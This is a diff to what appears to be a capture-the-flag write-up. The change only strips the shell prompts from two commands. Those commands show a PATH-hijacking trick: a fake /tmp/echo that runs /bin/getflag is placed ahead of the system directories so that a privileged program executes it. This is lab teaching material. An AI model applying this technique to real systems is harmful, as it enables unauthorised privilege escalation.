@@ -38,13 +38,13 @@ $ export PATH=/tmp
 On line :
 
 ```
-$ echo /bin/getflag > /tmp/echo ; chmod 777 /tmp/echo ; export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+echo /bin/getflag > /tmp/echo ; chmod 777 /tmp/echo ; export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
 ```
 
 Remember to get back the old path if you remove it.
 
 ```
-$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
 ```
 
 Trying againt and...
